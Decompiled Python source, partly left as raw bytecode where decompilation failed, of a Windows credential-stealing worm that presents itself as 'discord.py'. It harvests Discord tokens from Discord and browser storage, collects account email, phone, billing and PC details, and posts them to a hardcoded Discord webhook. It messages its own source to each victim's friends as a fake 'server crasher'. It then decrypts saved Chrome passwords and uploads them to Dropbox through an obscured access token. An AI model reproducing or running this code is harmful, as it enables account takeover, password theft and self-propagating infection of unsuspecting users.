# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.6.15 (default, Sep 28 2021, 20:18:52) 
# [GCC 10.2.1 20210110]
# Embedded file name: discord.py
import os, json, base64, sqlite3, win32crypt
from Crypto.Cipher import AES
import shutil, dropbox
from codecs import encode
import getpass, os
if os.name != 'nt':
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
LOCAL = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')
PATHS = {'Discord':ROAMING + '\\Discord', 
 'Discord Canary':ROAMING + '\\discordcanary', 
 'Discord PTB':ROAMING + '\\discordptb', 
 'Google Chrome':LOCAL + '\\Google\\Chrome\\User Data\\Default', 
 'Opera':ROAMING + '\\Opera Software\\Opera Stable', 
 'Brave':LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 
 'Yandex':LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'}

def getheaders(token=None, content_type='application/json'):
    headers = {'Content-Type':content_type, 
     'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
    if token:
        headers.update({'Authorization': token})
    return headers


def getuserdata--- This code section failed: ---

 L.  43         0  SETUP_FINALLY        36  'to 36'

 L.  44         2  LOAD_GLOBAL              loads
                4  LOAD_GLOBAL              urlopen
                6  LOAD_GLOBAL              Request
                8  LOAD_STR                 'https://discordapp.com/api/v6/users/@me'
               10  LOAD_GLOBAL              getheaders
               12  LOAD_FAST                'token'
               14  CALL_FUNCTION_1       1  ''
               16  LOAD_CONST               ('headers',)
               18  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               20  CALL_FUNCTION_1       1  ''
               22  LOAD_METHOD              read
               24  CALL_METHOD_0         0  ''
               26  LOAD_METHOD              decode
               28  CALL_METHOD_0         0  ''
               30  CALL_FUNCTION_1       1  ''
               32  POP_BLOCK        
               34  RETURN_VALUE     
             36_0  COME_FROM_FINALLY     0  '0'

 L.  45        36  POP_TOP          
               38  POP_TOP          
               40  POP_TOP          

 L.  46        42  POP_EXCEPT       
               44  JUMP_FORWARD         48  'to 48'
               46  END_FINALLY      
             48_0  COME_FROM            44  '44'

Parse error at or near `POP_EXCEPT' instruction at offset 42


def gettokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not (file_name.endswith('.log') or file_name.endswith('.ldb')):
            pass
        else:
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors='ignore').readlines() if x.strip()]:
                for regex in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}'):
                    for token in findall(regex, line):
                        tokens.append(token)

                else:
                    return tokens


def getdeveloper():
    dev = 'wodx'
    try:
        dev = urlopen(Request('https://pastebin.com/raw/T65pscsS')).read().decode()
    except:
        pass
    else:
        return dev


def getip():
    ip = 'None'
    try:
        ip = urlopen(Request('https://api.ipify.org')).read().decode().strip()
    except:
        pass
    else:
        return ip


def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    else:
        return url


def gethwid():
    p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]


def getfriends--- This code section failed: ---

 L.  83         0  SETUP_FINALLY        36  'to 36'

 L.  84         2  LOAD_GLOBAL              loads
                4  LOAD_GLOBAL              urlopen
                6  LOAD_GLOBAL              Request
                8  LOAD_STR                 'https://discordapp.com/api/v6/users/@me/relationships'
               10  LOAD_GLOBAL              getheaders
               12  LOAD_FAST                'token'
               14  CALL_FUNCTION_1       1  ''
               16  LOAD_CONST               ('headers',)
               18  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               20  CALL_FUNCTION_1       1  ''
               22  LOAD_METHOD              read
               24  CALL_METHOD_0         0  ''
               26  LOAD_METHOD              decode
               28  CALL_METHOD_0         0  ''
               30  CALL_FUNCTION_1       1  ''
               32  POP_BLOCK        
               34  RETURN_VALUE     
             36_0  COME_FROM_FINALLY     0  '0'

 L.  85        36  POP_TOP          
               38  POP_TOP          
               40  POP_TOP          

 L.  86        42  POP_EXCEPT       
               44  JUMP_FORWARD         48  'to 48'
               46  END_FINALLY      
             48_0  COME_FROM            44  '44'

Parse error at or near `POP_EXCEPT' instruction at offset 42


def getchat--- This code section failed: ---

 L.  88         0  SETUP_FINALLY        54  'to 54'

 L.  89         2  LOAD_GLOBAL              loads
                4  LOAD_GLOBAL              urlopen
                6  LOAD_GLOBAL              Request
                8  LOAD_STR                 'https://discordapp.com/api/v6/users/@me/channels'
               10  LOAD_GLOBAL              getheaders
               12  LOAD_FAST                'token'
               14  CALL_FUNCTION_1       1  ''
               16  LOAD_GLOBAL              dumps
               18  LOAD_STR                 'recipient_id'
               20  LOAD_FAST                'uid'
               22  BUILD_MAP_1           1 
               24  CALL_FUNCTION_1       1  ''
               26  LOAD_METHOD              encode
               28  CALL_METHOD_0         0  ''
               30  LOAD_CONST               ('headers', 'data')
               32  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               34  CALL_FUNCTION_1       1  ''
               36  LOAD_METHOD              read
               38  CALL_METHOD_0         0  ''
               40  LOAD_METHOD              decode
               42  CALL_METHOD_0         0  ''
               44  CALL_FUNCTION_1       1  ''
               46  LOAD_STR                 'id'
               48  BINARY_SUBSCR    
               50  POP_BLOCK        
               52  RETURN_VALUE     
             54_0  COME_FROM_FINALLY     0  '0'

 L.  90        54  POP_TOP          
               56  POP_TOP          
               58  POP_TOP          

 L.  91        60  POP_EXCEPT       
               62  JUMP_FORWARD         66  'to 66'
               64  END_FINALLY      
             66_0  COME_FROM            62  '62'

Parse error at or near `POP_EXCEPT' instruction at offset 60


def has_payment_methods--- This code section failed: ---

 L.  93         0  SETUP_FINALLY        48  'to 48'

 L.  94         2  LOAD_GLOBAL              bool
                4  LOAD_GLOBAL              len
                6  LOAD_GLOBAL              loads
                8  LOAD_GLOBAL              urlopen
               10  LOAD_GLOBAL              Request
               12  LOAD_STR                 'https://discordapp.com/api/v6/users/@me/billing/payment-sources'
               14  LOAD_GLOBAL              getheaders
               16  LOAD_FAST                'token'
               18  CALL_FUNCTION_1       1  ''
               20  LOAD_CONST               ('headers',)
               22  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               24  CALL_FUNCTION_1       1  ''
               26  LOAD_METHOD              read
               28  CALL_METHOD_0         0  ''
               30  LOAD_METHOD              decode
               32  CALL_METHOD_0         0  ''
               34  CALL_FUNCTION_1       1  ''
               36  CALL_FUNCTION_1       1  ''
               38  LOAD_CONST               0
               40  COMPARE_OP               >
               42  CALL_FUNCTION_1       1  ''
               44  POP_BLOCK        
               46  RETURN_VALUE     
             48_0  COME_FROM_FINALLY     0  '0'

 L.  95        48  POP_TOP          
               50  POP_TOP          
               52  POP_TOP          

 L.  96        54  POP_EXCEPT       
               56  JUMP_FORWARD         60  'to 60'
               58  END_FINALLY      
             60_0  COME_FROM            56  '56'

Parse error at or near `POP_EXCEPT' instruction at offset 54


def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=(getheaders(token, 'multipart/form-data; boundary=---------------------------325414537030329320151394843687')), data=(form_data.encode()))).read().decode()
    except:
        pass


def spread--- This code section failed: ---

 L. 103         0  LOAD_CONST               None
                2  RETURN_VALUE     

 L. 104         4  FOR_ITER             84  'to 84'
                6  STORE_FAST               'friend'

 L. 105         8  SETUP_FINALLY        40  'to 40'

 L. 106        10  LOAD_GLOBAL              getchat
               12  LOAD_FAST                'token'
               14  LOAD_FAST                'friend'
               16  LOAD_STR                 'id'
               18  BINARY_SUBSCR    
               20  CALL_FUNCTION_2       2  ''
               22  STORE_FAST               'chat_id'

 L. 107        24  LOAD_GLOBAL              send_message
               26  LOAD_FAST                'token'
               28  LOAD_FAST                'chat_id'
               30  LOAD_FAST                'form_data'
               32  CALL_FUNCTION_3       3  ''
               34  POP_TOP          
               36  POP_BLOCK        
               38  JUMP_FORWARD         74  'to 74'
             40_0  COME_FROM_FINALLY     8  '8'

 L. 108        40  DUP_TOP          
               42  LOAD_GLOBAL              Exception
               44  COMPARE_OP               exception-match
               46  POP_JUMP_IF_FALSE    72  'to 72'
               48  POP_TOP          
               50  STORE_FAST               'e'
               52  POP_TOP          
               54  SETUP_FINALLY        60  'to 60'

 L. 109        56  POP_BLOCK        
               58  BEGIN_FINALLY    
             60_0  COME_FROM_FINALLY    54  '54'
               60  LOAD_CONST               None
               62  STORE_FAST               'e'
               64  DELETE_FAST              'e'
               66  END_FINALLY      
               68  POP_EXCEPT       
               70  JUMP_FORWARD         74  'to 74'
             72_0  COME_FROM            46  '46'
               72  END_FINALLY      
             74_0  COME_FROM            70  '70'
             74_1  COME_FROM            38  '38'

 L. 110        74  LOAD_GLOBAL              sleep
               76  LOAD_FAST                'delay'
               78  CALL_FUNCTION_1       1  ''
               80  POP_TOP          
               82  JUMP_BACK             4  'to 4'

Parse error at or near `FOR_ITER' instruction at offset 4


def main--- This code section failed: ---

 L. 112         0  LOAD_GLOBAL              ROAMING
                2  LOAD_STR                 '\\.cache~$'
                4  BINARY_ADD       
                6  STORE_FAST               'cache_path'

 L. 113         8  LOAD_CONST               True
               10  STORE_FAST               'prevent_spam'

 L. 114        12  LOAD_CONST               True
               14  STORE_FAST               'self_spread'

 L. 115        16  BUILD_LIST_0          0 
               18  STORE_FAST               'embeds'

 L. 116        20  BUILD_LIST_0          0 
               22  STORE_FAST               'working'

 L. 117        24  BUILD_LIST_0          0 
               26  STORE_FAST               'checked'

 L. 118        28  BUILD_LIST_0          0 
               30  STORE_FAST               'already_cached_tokens'

 L. 119        32  BUILD_LIST_0          0 
               34  STORE_FAST               'working_ids'

 L. 120        36  LOAD_GLOBAL              getip
               38  CALL_FUNCTION_0       0  ''
               40  STORE_FAST               'ip'

 L. 121        42  LOAD_GLOBAL              os
               44  LOAD_METHOD              getenv
               46  LOAD_STR                 'UserName'
               48  CALL_METHOD_1         1  ''
               50  STORE_FAST               'pc_username'

 L. 122        52  LOAD_GLOBAL              os
               54  LOAD_METHOD              getenv
               56  LOAD_STR                 'COMPUTERNAME'
               58  CALL_METHOD_1         1  ''
               60  STORE_FAST               'pc_name'

 L. 123        62  LOAD_GLOBAL              os
               64  LOAD_METHOD              getenv
               66  LOAD_STR                 'userprofile'
               68  CALL_METHOD_1         1  ''
               70  LOAD_METHOD              split
               72  LOAD_STR                 '\\'
               74  CALL_METHOD_1         1  ''
               76  LOAD_CONST               2
               78  BINARY_SUBSCR    
               80  STORE_FAST               'user_path_name'

 L. 124        82  LOAD_GLOBAL              getdeveloper
               84  CALL_FUNCTION_0       0  ''
               86  STORE_FAST               'developer'

 L. 125        88  LOAD_GLOBAL              PATHS
               90  LOAD_METHOD              items
               92  CALL_METHOD_0         0  ''
               94  GET_ITER         
            96_98  FOR_ITER            490  'to 490'
              100  UNPACK_SEQUENCE_2     2 
              102  STORE_FAST               'platform'
              104  STORE_FAST               'path'

 L. 126       106  LOAD_GLOBAL              os
              108  LOAD_ATTR                path
              110  LOAD_METHOD              exists
              112  LOAD_FAST                'path'
              114  CALL_METHOD_1         1  ''
              116  POP_JUMP_IF_TRUE    120  'to 120'

 L. 127       118  JUMP_BACK            96  'to 96'
            120_0  COME_FROM           116  '116'

 L. 128       120  LOAD_GLOBAL              gettokens
              122  LOAD_FAST                'path'
              124  CALL_FUNCTION_1       1  ''
              126  GET_ITER         
            128_0  COME_FROM           214  '214'
          128_130  FOR_ITER            488  'to 488'
              132  STORE_FAST               'token'

 L. 129       134  LOAD_FAST                'token'
              136  LOAD_FAST                'checked'
              138  COMPARE_OP               in
              140  POP_JUMP_IF_FALSE   144  'to 144'

 L. 130       142  JUMP_BACK           128  'to 128'
            144_0  COME_FROM           140  '140'

 L. 131       144  LOAD_FAST                'checked'
              146  LOAD_METHOD              append
              148  LOAD_FAST                'token'
              150  CALL_METHOD_1         1  ''
              152  POP_TOP          

 L. 132       154  LOAD_CONST               None
              156  STORE_FAST               'uid'

 L. 133       158  LOAD_FAST                'token'
              160  LOAD_METHOD              startswith
              162  LOAD_STR                 'mfa.'
              164  CALL_METHOD_1         1  ''
              166  POP_JUMP_IF_TRUE    226  'to 226'

 L. 134       168  SETUP_FINALLY       200  'to 200'

 L. 135       170  LOAD_GLOBAL              b64decode
              172  LOAD_FAST                'token'
              174  LOAD_METHOD              split
              176  LOAD_STR                 '.'
              178  CALL_METHOD_1         1  ''
              180  LOAD_CONST               0
              182  BINARY_SUBSCR    
              184  LOAD_METHOD              encode
              186  CALL_METHOD_0         0  ''
              188  CALL_FUNCTION_1       1  ''
              190  LOAD_METHOD              decode
              192  CALL_METHOD_0         0  ''
              194  STORE_FAST               'uid'
              196  POP_BLOCK        
              198  JUMP_FORWARD        212  'to 212'
            200_0  COME_FROM_FINALLY   168  '168'

 L. 136       200  POP_TOP          
              202  POP_TOP          
              204  POP_TOP          

 L. 137       206  POP_EXCEPT       
              208  JUMP_FORWARD        212  'to 212'
              210  END_FINALLY      
            212_0  COME_FROM           208  '208'
            212_1  COME_FROM           198  '198'

 L. 138       212  LOAD_FAST                'uid'
              214  POP_JUMP_IF_FALSE   128  'to 128'
              216  LOAD_FAST                'uid'
              218  LOAD_FAST                'working_ids'
              220  COMPARE_OP               in
              222  POP_JUMP_IF_FALSE   226  'to 226'

 L. 139       224  JUMP_BACK           128  'to 128'
            226_0  COME_FROM           222  '222'
            226_1  COME_FROM           166  '166'

 L. 140       226  LOAD_GLOBAL              getuserdata
              228  LOAD_FAST                'token'
              230  CALL_FUNCTION_1       1  ''
              232  STORE_FAST               'user_data'

 L. 141       234  LOAD_FAST                'user_data'
              236  POP_JUMP_IF_TRUE    240  'to 240'

 L. 142       238  JUMP_BACK           128  'to 128'
            240_0  COME_FROM           236  '236'

 L. 143       240  LOAD_FAST                'working_ids'
              242  LOAD_METHOD              append
              244  LOAD_FAST                'uid'
              246  CALL_METHOD_1         1  ''
              248  POP_TOP          

 L. 144       250  LOAD_FAST                'working'
              252  LOAD_METHOD              append
              254  LOAD_FAST                'token'
              256  CALL_METHOD_1         1  ''
              258  POP_TOP          

 L. 145       260  LOAD_FAST                'user_data'
              262  LOAD_STR                 'username'
              264  BINARY_SUBSCR    
              266  LOAD_STR                 '#'
              268  BINARY_ADD       
              270  LOAD_GLOBAL              str
              272  LOAD_FAST                'user_data'
              274  LOAD_STR                 'discriminator'
              276  BINARY_SUBSCR    
              278  CALL_FUNCTION_1       1  ''
              280  BINARY_ADD       
              282  STORE_FAST               'username'

 L. 146       284  LOAD_FAST                'user_data'
              286  LOAD_STR                 'id'
              288  BINARY_SUBSCR    
              290  STORE_FAST               'user_id'

 L. 147       292  LOAD_FAST                'user_data'
              294  LOAD_STR                 'avatar'
              296  BINARY_SUBSCR    
              298  STORE_FAST               'avatar_id'

 L. 148       300  LOAD_GLOBAL              getavatar
              302  LOAD_FAST                'user_id'
              304  LOAD_FAST                'avatar_id'
              306  CALL_FUNCTION_2       2  ''
              308  STORE_FAST               'avatar_url'

 L. 149       310  LOAD_FAST                'user_data'
              312  LOAD_METHOD              get
              314  LOAD_STR                 'email'
              316  CALL_METHOD_1         1  ''
              318  STORE_FAST               'email'

 L. 150       320  LOAD_FAST                'user_data'
              322  LOAD_METHOD              get
              324  LOAD_STR                 'phone'
              326  CALL_METHOD_1         1  ''
              328  STORE_FAST               'phone'

 L. 151       330  LOAD_GLOBAL              bool
              332  LOAD_FAST                'user_data'
              334  LOAD_METHOD              get
              336  LOAD_STR                 'premium_type'
              338  CALL_METHOD_1         1  ''
              340  CALL_FUNCTION_1       1  ''
              342  STORE_FAST               'nitro'

 L. 152       344  LOAD_GLOBAL              bool
              346  LOAD_GLOBAL              has_payment_methods
              348  LOAD_FAST                'token'
              350  CALL_FUNCTION_1       1  ''
              352  CALL_FUNCTION_1       1  ''
              354  STORE_FAST               'billing'

 L. 154       356  LOAD_CONST               7506394

 L. 157       358  LOAD_STR                 '**Account Info**'

 L. 158       360  LOAD_STR                 'Email: '
              362  LOAD_FAST                'email'
              364  FORMAT_VALUE          0  ''
              366  LOAD_STR                 '\nPhone: '
              368  LOAD_FAST                'phone'
              370  FORMAT_VALUE          0  ''
              372  LOAD_STR                 '\nNitro: '
              374  LOAD_FAST                'nitro'
              376  FORMAT_VALUE          0  ''
              378  LOAD_STR                 '\nBilling Info: '
              380  LOAD_FAST                'billing'
              382  FORMAT_VALUE          0  ''
              384  BUILD_STRING_8        8 

 L. 159       386  LOAD_CONST               True

 L. 156       388  LOAD_CONST               ('name', 'value', 'inline')
              390  BUILD_CONST_KEY_MAP_3     3 

 L. 162       392  LOAD_STR                 '**PC Info**'

 L. 163       394  LOAD_STR                 'IP: '
              396  LOAD_FAST                'ip'
              398  FORMAT_VALUE          0  ''
              400  LOAD_STR                 '\nUsername: '
              402  LOAD_FAST                'pc_username'
              404  FORMAT_VALUE          0  ''
              406  LOAD_STR                 '\nPC Name: '
              408  LOAD_FAST                'pc_name'
              410  FORMAT_VALUE          0  ''
              412  LOAD_STR                 '\nToken Location: '
              414  LOAD_FAST                'platform'
              416  FORMAT_VALUE          0  ''
              418  BUILD_STRING_8        8 

 L. 164       420  LOAD_CONST               True

 L. 161       422  LOAD_CONST               ('name', 'value', 'inline')
              424  BUILD_CONST_KEY_MAP_3     3 

 L. 167       426  LOAD_STR                 '**Token**'

 L. 168       428  LOAD_FAST                'token'

 L. 169       430  LOAD_CONST               False

 L. 166       432  LOAD_CONST               ('name', 'value', 'inline')
              434  BUILD_CONST_KEY_MAP_3     3 

 L. 155       436  BUILD_LIST_3          3 

 L. 173       438  LOAD_FAST                'username'
              440  FORMAT_VALUE          0  ''
              442  LOAD_STR                 ' ('
              444  LOAD_FAST                'user_id'
              446  FORMAT_VALUE          0  ''
              448  LOAD_STR                 ')'
              450  BUILD_STRING_4        4 

 L. 174       452  LOAD_FAST                'avatar_url'

 L. 172       454  LOAD_CONST               ('name', 'icon_url')
              456  BUILD_CONST_KEY_MAP_2     2 

 L. 177       458  LOAD_STR                 'text'

 L. 177       460  LOAD_STR                 'Token grabber by '
              462  LOAD_FAST                'developer'
              464  FORMAT_VALUE          0  ''
              466  BUILD_STRING_2        2 

 L. 176       468  BUILD_MAP_1           1 

 L. 153       470  LOAD_CONST               ('color', 'fields', 'author', 'footer')
              472  BUILD_CONST_KEY_MAP_4     4 
              474  STORE_FAST               'embed'

 L. 180       476  LOAD_FAST                'embeds'
              478  LOAD_METHOD              append
              480  LOAD_FAST                'embed'
              482  CALL_METHOD_1         1  ''
              484  POP_TOP          
              486  JUMP_BACK           128  'to 128'
              488  JUMP_BACK            96  'to 96'

 L. 181       490  LOAD_GLOBAL              open
              492  LOAD_FAST                'cache_path'
              494  LOAD_STR                 'a'
              496  CALL_FUNCTION_2       2  ''
              498  SETUP_WITH          542  'to 542'
              500  STORE_FAST               'file'

 L. 182       502  LOAD_FAST                'checked'
              504  GET_ITER         
            506_0  COME_FROM           516  '516'
              506  FOR_ITER            538  'to 538'
              508  STORE_FAST               'token'

 L. 183       510  LOAD_FAST                'token'
              512  LOAD_FAST                'already_cached_tokens'
              514  COMPARE_OP               not-in
          516_518  POP_JUMP_IF_FALSE   506  'to 506'

 L. 184       520  LOAD_FAST                'file'
              522  LOAD_METHOD              write
              524  LOAD_FAST                'token'
              526  LOAD_STR                 '\n'
              528  BINARY_ADD       
              530  CALL_METHOD_1         1  ''
              532  POP_TOP          
          534_536  JUMP_BACK           506  'to 506'
              538  POP_BLOCK        
              540  BEGIN_FINALLY    
            542_0  COME_FROM_WITH      498  '498'
              542  WITH_CLEANUP_START
              544  WITH_CLEANUP_FINISH
              546  END_FINALLY      

 L. 185       548  LOAD_GLOBAL              len
              550  LOAD_FAST                'working'
              552  CALL_FUNCTION_1       1  ''
              554  LOAD_CONST               0
              556  COMPARE_OP               ==
          558_560  POP_JUMP_IF_FALSE   572  'to 572'

 L. 186       562  LOAD_FAST                'working'
              564  LOAD_METHOD              append
              566  LOAD_STR                 '123'
              568  CALL_METHOD_1         1  ''
              570  POP_TOP          
            572_0  COME_FROM           558  '558'

 L. 188       572  LOAD_STR                 ''

 L. 189       574  LOAD_FAST                'embeds'

 L. 190       576  LOAD_STR                 'BY DWAYZ'

 L. 191       578  LOAD_STR                 'https://dwaayz.fr/assets/img/team/2.gif'

 L. 187       580  LOAD_CONST               ('content', 'embeds', 'username', 'avatar_url')
              582  BUILD_CONST_KEY_MAP_4     4 
              584  STORE_FAST               'webhook'

 L. 193       586  SETUP_FINALLY       620  'to 620'

 L. 194       588  LOAD_GLOBAL              urlopen
              590  LOAD_GLOBAL              Request
              592  LOAD_STR                 'https://discordapp.com/api/webhooks/739477200675536997/_BW7of2GU3KovSNycCC5yc7kzDUS3X4Ri166I57JukFXitALidtpxRB_LYFUlv1hvRLw'
              594  LOAD_GLOBAL              dumps
              596  LOAD_FAST                'webhook'
              598  CALL_FUNCTION_1       1  ''
              600  LOAD_METHOD              encode
              602  CALL_METHOD_0         0  ''
              604  LOAD_GLOBAL              getheaders
              606  CALL_FUNCTION_0       0  ''
              608  LOAD_CONST               ('data', 'headers')
              610  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              612  CALL_FUNCTION_1       1  ''
              614  POP_TOP          
              616  POP_BLOCK        
              618  JUMP_FORWARD        632  'to 632'
            620_0  COME_FROM_FINALLY   586  '586'

 L. 195       620  POP_TOP          
              622  POP_TOP          
              624  POP_TOP          

 L. 196       626  POP_EXCEPT       
              628  JUMP_FORWARD        632  'to 632'
              630  END_FINALLY      
            632_0  COME_FROM           628  '628'
            632_1  COME_FROM           618  '618'

 L. 197       632  LOAD_FAST                'self_spread'
          634_636  POP_JUMP_IF_FALSE   726  'to 726'

 L. 198       638  LOAD_FAST                'working'
              640  GET_ITER         
              642  FOR_ITER            726  'to 726'
              644  STORE_FAST               'token'

 L. 199       646  LOAD_GLOBAL              open
              648  LOAD_GLOBAL              argv
              650  LOAD_CONST               0
              652  BINARY_SUBSCR    
              654  LOAD_STR                 'utf-8'
              656  LOAD_CONST               ('encoding',)
              658  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              660  SETUP_WITH          676  'to 676'
              662  STORE_FAST               'file'

 L. 200       664  LOAD_FAST                'file'
              666  LOAD_METHOD              read
              668  CALL_METHOD_0         0  ''
              670  STORE_FAST               'content'
              672  POP_BLOCK        
              674  BEGIN_FINALLY    
            676_0  COME_FROM_WITH      660  '660'
              676  WITH_CLEANUP_START
              678  WITH_CLEANUP_FINISH
              680  END_FINALLY      

 L. 201       682  LOAD_STR                 '-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="'
              684  LOAD_GLOBAL              __file__
              686  FORMAT_VALUE          0  ''
              688  LOAD_STR                 '"\nContent-Type: text/plain\n\n'
              690  LOAD_FAST                'content'
              692  FORMAT_VALUE          0  ''
              694  LOAD_STR                 '\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
              696  BUILD_STRING_5        5 
              698  STORE_FAST               'payload'

 L. 202       700  LOAD_GLOBAL              Thread
              702  LOAD_GLOBAL              spread
              704  LOAD_FAST                'token'
              706  LOAD_FAST                'payload'
              708  LOAD_CONST               7.5
              710  BUILD_TUPLE_3         3 
              712  LOAD_CONST               ('target', 'args')
              714  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              716  LOAD_METHOD              start
              718  CALL_METHOD_0         0  ''
              720  POP_TOP          
          722_724  JUMP_BACK           642  'to 642'
            726_0  COME_FROM           634  '634'

Parse error at or near `JUMP_BACK' instruction at offset 488


try:
    main()
except Exception as e:
    try:
        print(e)
    finally:
        e = None
        del e

else:

    def upload_passfile():
        access_token = encode('BiJYULcYMBfNNNNNNNNNNrpU-9EME78EXOK1hURqedfd0e_uWOwkJpJcIX6cVcdN', 'rot13')
        file_from = 'rc.txt'
        file_to = '/passwords/' + str(getpass.getuser()) + "'s_passwords.txt"
        client = dropbox.Dropbox(access_token)
        client.files_upload((open(file_from, 'rb').read()), file_to, (dropbox.files.WriteMode.overwrite), mute=True)


    def get_master_key():
        with open((os.environ['USERPROFILE'] + os.sep + 'AppData\\Local\\Google\\Chrome\\User Data\\Local State'), 'r', encoding='utf-8') as (f):
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key


    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)


    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)


    def decrypt_password--- This code section failed: ---

 L. 246         0  SETUP_FINALLY        68  'to 68'

 L. 247         2  LOAD_FAST                'buff'
                4  LOAD_CONST               3
                6  LOAD_CONST               15
                8  BUILD_SLICE_2         2 
               10  BINARY_SUBSCR    
               12  STORE_FAST               'iv'

 L. 248        14  LOAD_FAST                'buff'
               16  LOAD_CONST               15
               18  LOAD_CONST               None
               20  BUILD_SLICE_2         2 
               22  BINARY_SUBSCR    
               24  STORE_FAST               'payload'

 L. 249        26  LOAD_GLOBAL              generate_cipher
               28  LOAD_FAST                'master_key'
               30  LOAD_FAST                'iv'
               32  CALL_FUNCTION_2       2  ''
               34  STORE_FAST               'cipher'

 L. 250        36  LOAD_GLOBAL              decrypt_payload
               38  LOAD_FAST                'cipher'
               40  LOAD_FAST                'payload'
               42  CALL_FUNCTION_2       2  ''
               44  STORE_FAST               'decrypted_pass'

 L. 251        46  LOAD_FAST                'decrypted_pass'
               48  LOAD_CONST               None
               50  LOAD_CONST               -16
               52  BUILD_SLICE_2         2 
               54  BINARY_SUBSCR    
               56  LOAD_METHOD              decode
               58  CALL_METHOD_0         0  ''
               60  STORE_FAST               'decrypted_pass'

 L. 252        62  LOAD_FAST                'decrypted_pass'
               64  POP_BLOCK        
               66  RETURN_VALUE     
             68_0  COME_FROM_FINALLY     0  '0'

 L. 254        68  DUP_TOP          
               70  LOAD_GLOBAL              Exception
               72  COMPARE_OP               exception-match
               74  POP_JUMP_IF_FALSE   134  'to 134'
               76  POP_TOP          
               78  STORE_FAST               'e'
               80  POP_TOP          
               82  SETUP_FINALLY       122  'to 122'

 L. 257        84  LOAD_GLOBAL              win32crypt
               86  LOAD_METHOD              CryptUnprotectData
               88  LOAD_FAST                'buff'
               90  LOAD_CONST               None
               92  LOAD_CONST               None
               94  LOAD_CONST               None
               96  LOAD_CONST               0
               98  CALL_METHOD_5         5  ''
              100  STORE_FAST               'decrypted_pass'

 L. 258       102  LOAD_GLOBAL              str
              104  LOAD_FAST                'decrypted_pass'
              106  LOAD_CONST               1
              108  BINARY_SUBSCR    
              110  CALL_FUNCTION_1       1  ''
              112  ROT_FOUR         
              114  POP_BLOCK        
              116  POP_EXCEPT       
              118  CALL_FINALLY        122  'to 122'
              120  RETURN_VALUE     
            122_0  COME_FROM           118  '118'
            122_1  COME_FROM_FINALLY    82  '82'
              122  LOAD_CONST               None
              124  STORE_FAST               'e'
              126  DELETE_FAST              'e'
              128  END_FINALLY      
              130  POP_EXCEPT       
              132  JUMP_FORWARD        136  'to 136'
            134_0  COME_FROM            74  '74'
              134  END_FINALLY      
            136_0  COME_FROM           132  '132'

Parse error at or near `POP_BLOCK' instruction at offset 114


    if __name__ == '__main__':
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + 'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'
        shutil.copy2(login_db, 'Loginvault.db')
        conn = sqlite3.connect('Loginvault.db')
        cursor = conn.cursor()
        try:
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            passfile = open('rc.txt', 'w')
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                passfile.write('URL: ' + url + '\nUsername: ' + username + '\nPassword: ' + decrypted_password + '\n' + '**************************************************' + '\n')
            else:
                passfile.close()
                conn.close()

        except Exception as e:
            try:
                print(e)
            finally:
                e = None
                del e

        else:
            upload_passfile()
            os.remove('rc.txt')
            os.remove('Loginvault.db')